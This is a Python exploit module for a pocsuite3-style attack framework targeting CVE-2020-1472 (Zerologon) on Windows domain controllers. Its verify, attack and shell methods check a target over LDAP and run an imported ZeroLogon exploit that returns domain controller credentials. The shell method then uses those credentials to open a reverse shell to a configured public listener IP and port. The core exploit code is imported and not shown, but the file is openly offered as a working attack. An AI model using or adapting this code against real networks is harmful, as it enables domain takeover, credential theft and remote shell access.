"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
import json
from Framework.Valueconfig import FORMATTIME, ValueStatus
from collections import OrderedDict
import datetime
import random
import string
from urllib.parse import quote, urljoin, urlparse
from Framework.Library.Function.Function.PocSuite.Function import decode_data_input_poc
from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths,get_listener_ip, get_listener_port
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str


import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
from configvalue import *
from Framework.Library.Function.Function.PocSuite.init_pocs.cve_2020_1472.Zerologon_connect import ZeroLogon
class DemoPOC(POCBase):
    vulID = 'CVE-2020-1472'  # ssvid
    version = '1.0'
    author = ['asdcxsd']
    vulDate = '17/08/2020'
    createDate = '2021/09/21'
    updateDate = '2021/09/21'
    references = ['https://nvd.nist.gov/vuln/detail/cve-2020-1472']
    name = 'Windows Netlogon Remote Protocol: Remote code execution '
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.SERVER, "pocType": "Windows"
                }
    appName = 'windows-cve-2020-1472'
    appVersion = 'CVE-2020-1472'
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller, using the Netlogon Remote Protocol (MS-NRPC), aka 'Netlogon Elevation of Privilege Vulnerability'. '''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''Score: 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)'''
    url_result = {}
    def _verify(self, update=True):
        if update:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['IN_IP'][0]
                self.port = config_input['Input']['RECON_PORTS']
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
        result = {}
        if "389" in self.port:
            zero = ZeroLogon(self.url)
            ans = zero.verify()
            if ans == 1:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = self.url
                result['VerifyInfo']['dc_main'] = zero.dc_name
        if update:
            return self.parse_output(result)
        else:
            return result

    def _attack(self):
        config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
        try:
            self.url = config_input['Input']['IN_IP'][0]
            self.port = config_input['Input']['RECON_PORTS']
        except Exception as e:
            raise Exception("Error " +  self.appName +   " :" + str(e))
        try:
            ans = self._verify(update=False)
            result = {}
            if ans != {}:
                try:
                    zero = ZeroLogon(self.url)
                    output = zero.attack()
                    result['ShellInfo'] = output
                    result['ShellInfo']['url'] = [self.url]
                except Exception as e:
                    print("Error CVE-2020-1472: ", e)
            return self.parse_output(result)
        except Exception as e:
            print("Error CVE-2020-1472:", e)
        return self.parse_output(False)

    def _shell(self):
        result = {}
        result['ShellInfo'] = {
                'Status': 'Success'
            }
        try:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['EXPLOIT_POCS']
                lhost_running = config_input['Config']['Cf_PublicIP']
                lport_running = config_input['Config']['Cf_PublicPort']
                #lport_running = 4443
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
            #self._verify(update=False)
            dc_name = self.url[0]['result']['ShellInfo']['dc_name']
            dc_ip = self.url[0]['result']['ShellInfo']['dc_ip']
            username = self.url[0]['result']['ShellInfo']['username']
            password = self.url[0]['result']['ShellInfo']['password']
            zero = ZeroLogon(dc_ip)
            zero.username = username
            zero.password = password
            statuserr = zero.shell(lhost_running, lport_running)
            if (statuserr != 1):
                result['ShellInfo']['Status'] = "Error"
            return self.parse_output(result)
        except  Exception as e:
            if type(e) == requests.exceptions.ReadTimeout:
                return self.parse_output(result)
            print("Error run shell", self.name, e)
            pass
        return self.parse_output(False)
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
